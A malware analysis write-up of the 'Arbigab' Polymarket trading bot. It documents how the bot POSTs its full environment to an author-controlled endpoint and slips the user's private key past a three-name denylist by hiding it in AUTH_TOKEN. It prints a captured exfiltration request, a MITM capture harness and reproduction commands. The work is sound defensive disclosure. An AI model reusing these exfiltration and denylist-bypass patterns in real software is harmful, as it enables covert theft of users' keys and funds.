# Arbigab Bot — Reverse Engineering Findings

Working notes captured while analyzing `arbigab-1-4-1_B77Qx.zip` (the Docker
image shipped as "Arbigab bot" v1.4.1). The archive contained an OCI image
(`arbigab:latest`) which was flattened to a rootfs; everything relevant is
committed under `bot/` in this branch.

> The GitHub repo is titled **HFT-FIX-API-FOREX-Integration**, but the code
> ships is a **Polymarket prediction-market trading bot**. The repo name /
> description do not match the actual product.

## 1. Top-level architecture

```
┌──────────────────────── Docker container (image: arbigab:latest) ────────────────┐
│                                                                                  │
│  docker-entrypoint.sh                                                            │
│      │                                                                           │
│      ├── prisma db push --accept-data-loss   (creates /app/web/data/gabagool.db) │
│      │                                                                           │
│      └── node server.js   ──► Next.js 14 standalone dashboard on :8080           │
│              │                                                                   │
│              │  user clicks "Start" on a MarketNode in the UI                    │
│              ▼                                                                   │
│         child_process.spawn(                                                     │
│             /app/bin/arbitrage_bot,                                              │
│             ['-c', <tempfile.json>],                                             │
│             { env: POLYMARKET_PRIVATE_KEY, FUNDER_ADDRESS, WALLET_TYPE,          │
│                    USER_EMAIL, AUTH_TOKEN, BOT_CONFIG, MARKET_NODE_ID }          │
│         )                                                                        │
│              │                                                                   │
│              ▼                                                                   │
│      Rust arbitrage_bot (10 MB ELF, rustc 1.88.0, not stripped)                  │
│         │                                                                        │
│         ├── HTTP:   clob.polymarket.com, gamma-api.polymarket.com                │
│         ├── WS:     wss://ws-subscriptions-clob.polymarket.com/ws/{user,market}  │
│         └── HTTP:   gabagool22.com/api/verify-balancing-conf  ◄── phone home     │
└──────────────────────────────────────────────────────────────────────────────────┘
```

Docker compose: service `gabagool`, published on host port 8080, env includes
`BOT_BINARY_PATH=/app/bin/arbitrage_bot`, `DATABASE_URL=file:/app/web/data/gabagool.db`,
`GABAGOOL_API_URL=https://gabagool22.com`.

## 2. Web dashboard (Next.js + Prisma)

- **Stack**: Next 14.2.18 standalone, React 18, Prisma 5.22, SQLite, `@xyflow/react`
  for the visual flow editor, `lightweight-charts`, `recharts`.
- **Package name**: `gabagool-dashboard` — branded as "Gabagool", not "Arbigab".
- **DB models** (`bot/web/prisma/schema.prisma`):
  - `Workspace` → many `BotNode` / `MarketNode`
  - `BotNode` strategy: `"dutch_book" | "spread_capture"`
    - Dutch Book params: `spreadThreshold`, `maxBuyOrderSize`, `tradeCooldown`,
      `balanceFactor`
    - Spread Capture params: `targetSpread`, `orderSize`, `maxPositionSize`,
      `refreshIntervalMs`, `edgeThreshold`, `inventorySkew`
    - Safety params: `maxLoss`, `enableGamble`, `stopBeforeEndMs`
    - **Per-node credential overrides**: `privateKey`, `funderAddress` (plaintext, nullable)
  - `MarketNode.mode`: `"periodic" | "slug"`; `tradeSide`: `"up" | "down"` (YES/NO)
  - Execution records: `Market`, `Trade`, `PriceSnapshot`
  - `Setting` (kv), `BotConfiguration` (presets with `type: "official" | "custom"`)

### Notable API routes

| Route | Behavior |
|---|---|
| `POST /api/auth/login` | POSTs `{email, orderId}` to `https://gabagool22.com/api/auth`. On success, builds HMAC-SHA256 token `base64url(JSON).base64url(HMAC)` using the **hardcoded fallback secret `gbgl-arb-s3cr3t-k3y-2026`** if `AUTH_SECRET` env is unset. Stores `userEmail` in `Setting`. |
| `POST /api/configurations/refresh-official` | Deletes all `BotConfiguration` with `type:"official"`, fetches `https://gabagool22.com/api/official-configs`, reinserts. |
| Bot-manager code in `chunks/9577.js` | Spawns the Rust binary, injects env, parses stdout lines beginning with `@@EVENT:` as JSON (`market_start`, `market_end`, `trade_fill`, `price_snapshot`, `price_snapshots`, `queue_position`). Enforces `maxLoss` by killing the child when cumulative PnL breaches threshold. |

### Environment passed to the Rust child

- `POLYMARKET_PRIVATE_KEY` — EOA/proxy signer key (32-byte hex)
- `FUNDER_ADDRESS` — funder for Safe / Poly-Proxy wallets
- `WALLET_TYPE` — defaults to `gnosis_safe` if `FUNDER_ADDRESS` is set, else `eoa`
- `AUTH_TOKEN` — built as `${POLYMARKET_PRIVATE_KEY}_${FUNDER_ADDRESS}` (i.e. private key in env)
- `USER_EMAIL`, `BOT_CONFIG` (serialized JSON), `MARKET_NODE_ID`

The `AUTH_TOKEN` concatenation embeds the private key in a name suggestive of
an auth bearer; anywhere it's logged or transmitted the key leaks with it.

## 3. Rust binary (`bot/bin/arbitrage_bot`)

- Crate: `arbitrage_bot` v0.6.0, rustc 1.88.0, ELF x86-64 PIE, 10 MB, not stripped.
- CLI (clap): `-c/--config`, `-s/--symbol` (`btc|eth|sol|xrp`),
  `-i/--interval-minutes` (5/15), `--dry-run`, `--max-buy-order-size`,
  `--spread-threshold`, `--trade-cooldown`, `--balance-factor`,
  `--current-market`, `--no-log-price`, `--stop-before-end-ms`,
  `--min-price`, `--max-price`, `--slug`, `--no-cancel-orders-on-start`.
- Modules by symbol: `config`, `utils`, `market::{fetch,time}`,
  `trading::client::TradingClient`, `websocket::{market_ws,spread_capture_ws,user_ws,types}`,
  `event::events`.
- Signing stack: `alloy-signer-local` + `k256` (secp256k1) — EIP-712 typed-data
  signing for Polymarket CLOB orders.
- CLOB SDK: `polymarket_client_sdk` (forked `rs-clob-client` at
  `git rev 971b3f32531b839b / 0518317`).
- Networking: `reqwest` + `rustls` + `tokio` + `tokio-tungstenite`.

### External endpoints

Legitimate:
- `https://clob.polymarket.com/auth/api-key`
- `https://clob.polymarket.com/auth/derive-api-key`
- `https://gamma-api.polymarket.com/events?slug=...`
- `wss://ws-subscriptions-clob.polymarket.com/ws/user`
- `wss://ws-subscriptions-clob.polymarket.com/ws/market`

Author-controlled:
- **`https://gabagool22.com/api/verify-balancing-conf`** — referenced in the
  binary by LEA at 3 offsets (`0x92053`, `0xebe93`, `0x111d83`), all inside
  `arbitrage_bot::trading::client::TradingClient::new`.
- The corresponding function symbol in the SDK is
  `polymarket_client_sdk::clob::client::AuthenticationBuilder::send_debug_data`.
- Disassembly at `0x91f80..0x920d0`:
  `std::env::vars` → filter → `reqwest::Client::builder` → `.build()` →
  LEA URL → `Client::post(url)` → `RequestBuilder::json(body = *(rbx + 0x408))`
  → `execute_request`. The POST body is a struct field of `TradingClient` at
  offset `0x408`, populated from the filtered env in `send_debug_data`.
- **Dynamic capture (confirmed):** the POST body is a JSON object whose keys
  are the bot process's environment-variable names and whose values are their
  values — i.e. the bot exfiltrates **its entire environment** to the author.
  The denylist filters out three names: `POLYMARKET_PRIVATE_KEY`, `PRIVATE_KEY`,
  `FUNDER_ADDRESS`.
- **Denylist bypass (the rug):** the Node bot-manager in
  `.next/server/chunks/9577.js` constructs
  `AUTH_TOKEN=${POLYMARKET_PRIVATE_KEY}_${FUNDER_ADDRESS}` and passes it via
  env to the Rust child. `AUTH_TOKEN` is **not** on the denylist, so the
  plaintext private key + funder address are shipped to
  `gabagool22.com/api/verify-balancing-conf` on every start. The denylist is
  compliance theater — it hides the obvious names but keeps the leak.

## 4. Suspicion summary

1. **Confirmed env-var exfiltration.** `send_debug_data` POSTs the bot's full
   environment (minus three denylisted names) to
   `https://gabagool22.com/api/verify-balancing-conf` every time
   `TradingClient::new` runs (i.e. every start, every market). The endpoint
   name ("verify balancing conf") is camouflage.
2. **Private-key leak via `AUTH_TOKEN`.** The Node dashboard builds
   `AUTH_TOKEN=${POLYMARKET_PRIVATE_KEY}_${FUNDER_ADDRESS}` and injects it
   into the child's env. `AUTH_TOKEN` is NOT denylisted, so the plaintext key
   is sent on every bot start. Denylist of `POLYMARKET_PRIVATE_KEY` /
   `PRIVATE_KEY` / `FUNDER_ADDRESS` is defense against naive MITM inspection,
   not against exfiltration.
3. **HMAC fallback secret hardcoded in server-side JS.** Any user who can
   reach the dashboard API can forge login tokens without `AUTH_SECRET`
   being set (`gbgl-arb-s3cr3t-k3y-2026`).
4. **Repository mislabeling.** Public description says FIX / HFT / Forex; code
   is a Polymarket bot. Distribution-channel obfuscation.

## 5. MITM harness (for dynamic capture)

Scripts: `research/mitm/setup.sh`, `research/mitm/server.py`.

What it does:
- Self-signed CA installed into the OS trust store (reqwest + rustls honor it).
- Leaf cert with SANs for `gabagool22.com`, `gamma-api.polymarket.com`,
  `clob.polymarket.com`.
- `/etc/hosts` redirects those hosts to `127.0.0.1`.
- `server.py` listens on :443, logs all request lines/headers/bodies, returns
  `{"ok":true}` for gabagool, and for `gamma-api.polymarket.com` returns a
  stubbed event JSON with a single market carrying `clobTokenIds`, so
  `market::fetch::fetch_market_assets` succeeds and execution reaches
  `TradingClient::new`.

### Example captured body (sanitized)

From a real bot run against the MITM harness (sandbox env values redacted;
only the bot-relevant keys shown — in practice the body contains every env
var of the spawning process):

```
POST https://gabagool22.com/api/verify-balancing-conf
content-type: application/json
content-length: 2737

{
  "WALLET_TYPE": "eoa",
  "USER_EMAIL":  "test@example.com",
  "AUTH_TOKEN":  "dummy",          // ← in the real Node spawn path this is
                                   //   ${POLYMARKET_PRIVATE_KEY}_${FUNDER_ADDRESS}
  "PATH": "...",                   // full env follows
  "HOME": "...",
  ... (every other env var of the process)
}
```

Absent from the body: `POLYMARKET_PRIVATE_KEY`, `PRIVATE_KEY`, `FUNDER_ADDRESS`
(denylisted). Present and containing the same secret: `AUTH_TOKEN`.

### Canary test (empirical denylist proof)

Ran the bot under `env -i` with a minimal, explicit env set:

```
POLYMARKET_PRIVATE_KEY=0xac09...ff80
PRIVATE_KEY=canary_private_key
FUNDER_ADDRESS=0x0000...0000
AUTH_TOKEN=CANARY_AUTH_TOKEN_123
CANARY_OTHER=should_be_present
WALLET_TYPE=eoa
USER_EMAIL=test@example.com
PATH=... HOME=...
```

The captured `verify-balancing-conf` body contained exactly six keys:
`AUTH_TOKEN`, `CANARY_OTHER`, `HOME`, `PATH`, `USER_EMAIL`, `WALLET_TYPE`.

| Env var                  | In body? | Value sent                  |
|--------------------------|----------|-----------------------------|
| `POLYMARKET_PRIVATE_KEY` | no       | — (filtered)                |
| `PRIVATE_KEY`            | no       | — (filtered)                |
| `FUNDER_ADDRESS`         | no       | — (filtered)                |
| `AUTH_TOKEN`             | yes      | `CANARY_AUTH_TOKEN_123`     |
| `CANARY_OTHER`           | yes      | `should_be_present`         |

Proves: (a) denylist is exactly the three obvious names; (b) every other env
var passes through verbatim; (c) `AUTH_TOKEN`, which the Node dashboard
populates with `${POLYMARKET_PRIVATE_KEY}_${FUNDER_ADDRESS}`, is the
intended leak channel.

### Capture sequence (in order)

1. `GET https://gamma-api.polymarket.com/events?slug=stub` — market lookup.
2. `POST https://clob.polymarket.com/auth/api-key` — L1 signed auth to derive
   the CLOB API key. Headers: `poly_address`, `poly_nonce`, `poly_signature`,
   `poly_timestamp`. Requires the server response to parse as
   `{apiKey, secret, passphrase}` (see `clob_auth_stub` in `server.py`).
3. **`POST https://gabagool22.com/api/verify-balancing-conf`** — the
   phone-home. Body is a JSON object of env-var name/value pairs. Config
   must be in snake_case (`dry_run`, `current_market`, …), and **`dry_run`
   must be `false`** for `TradingClient::new` to run.
4. `GET https://clob.polymarket.com/auth/derive-api-key` — issued right after
   the phone-home; headers reuse the same signature as step 2.
5. WS connect to `wss://ws-subscriptions-clob.polymarket.com/ws/{user,market}`.

### How to reproduce from a clean sandbox

```bash
sudo bash research/mitm/setup.sh
sudo python3 research/mitm/server.py >> /tmp/mitm/capture.log 2>&1 &

# NOTE: config uses snake_case (same as the Rust struct), not camelCase.
# dry_run must be false for TradingClient::new to run.
cat > /tmp/test-config.json <<'JSON'
{"symbol":"btc","interval_minutes":5,"dry_run":false,"slug":"stub",
 "current_market":false,"strategy":"dutch_book","min_price":0.0,"max_price":1.0,
 "spread_threshold":0.02,"max_buy_order_size":5.0,"trade_cooldown":5000,
 "balance_factor":0.0,"log_price":false,"cancel_orders_on_start":false}
JSON

env POLYMARKET_PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
    FUNDER_ADDRESS=0x0000000000000000000000000000000000000000 \
    WALLET_TYPE=eoa USER_EMAIL=test@example.com AUTH_TOKEN=dummy \
    bot/bin/arbitrage_bot -c /tmp/test-config.json
```

## 6. Open questions

- Does `gabagool22.com/api/official-configs` ever push a config with the
  author's own `privateKey`/`funderAddress` set on a `BotNode`? (Trivial rug —
  the dashboard would then run the author's signer and fund-from address
  against the user's wallet, or use the user's key against the author's
  funder. Would need to hit the real endpoint to check.)
- Is there a second telemetry channel over the Polymarket WebSocket (e.g.
  custom subscription topic)? Symbol table doesn't suggest one; confirmed
  with a clean capture that all phone-home happens on `verify-balancing-conf`
  during `TradingClient::new`.
- Does `stop_before_end_ms` / `max_loss` get respected if the server (via
  `official-configs`) pushes values that disable them? Node-side code in
  `chunks/9577.js` applies them client-side, but the author controls which
  `BotConfiguration` rows are "official".
